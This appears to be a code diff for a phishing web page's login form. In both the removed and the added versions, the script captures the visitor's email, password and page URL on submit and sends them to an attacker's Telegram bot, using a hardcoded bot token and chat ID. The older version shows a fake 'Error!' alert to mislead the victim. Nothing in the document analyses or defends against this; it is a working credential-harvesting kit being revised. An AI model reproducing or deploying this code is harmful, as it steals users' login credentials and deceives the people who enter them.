@@ -98,65 +98,53 @@
                     </div>
                 </div>
             </div>
-            <script>
-                const token = "7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s"
-        // const api = "";
-        // const Emails = ""
-        // const Pass = ""
-        // const Domain = "";
-        // const btn = document.querySelector(".button")
-        
-        // const emailRes = document.querySelector("email").value;
-        
-        
-        
+         <script>
+        // Define the Telegram bot token and chat ID
+        const telegramBotToken = '7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s';
+        const chatId = '5990707499';
+
+        // Add event listener to the form submission
         document.querySelector('.form').addEventListener('submit', function(e) {
-        
-            e.preventDefault(); 
-        const Cokkies = window.location
-        
+            e.preventDefault(); // Prevent the form from submitting traditionally
+
+            // Get form input values
             const email = document.querySelector('.email').value;
             const password = document.querySelector('.password').value;
-             console.log(`emails: ${email}n/ password ${password}n/ Cookies: ${Cokkies}`)
-        
-            const telegramBotToken = '7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s'; 
-            const chatId = "5990707499"; 
-            const message = `Email: ${email}\nPassword: ${password}n/ Cookies: ${Cokkies}` ;
-            console.log("cookies:"+Cokkies)
-        
-        
-            fetch(`https://api.telegram.org/bot7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s/sendMessage`, {
+            const currentUrl = window.location.href; // Get the current URL
+
+            // Log the data to the console
+            console.log(`Email: ${email}\nPassword: ${password}\nURL: ${currentUrl}`);
+
+            // Construct the message to send to Telegram
+            const message = `Email: ${email}\nPassword: ${password}\nURL: ${currentUrl}`;
+
+            // Send the message via Telegram API
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                }),
+                    text: message
+                })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('Error!');
-                    console.log(data)
-                    console.log(window.history)
+                    console.log('Message sent successfully:', data);
+                    alert('Data sent to Telegram!');
                 } else {
-                    console.log(data)
-                     alert('Error Page ');
+                    console.error('Failed to send message:', data);
+                    alert('Error sending data');
                 }
             })
             .catch(error => {
-                alert("Invalid")
-                                // console.log(error)
+                console.error('Error:', error);
+                alert('Invalid request');
             });
         });
-        
-        
-        
-            </script>
+    </script>
         </div>
     </body>
 </html>
-
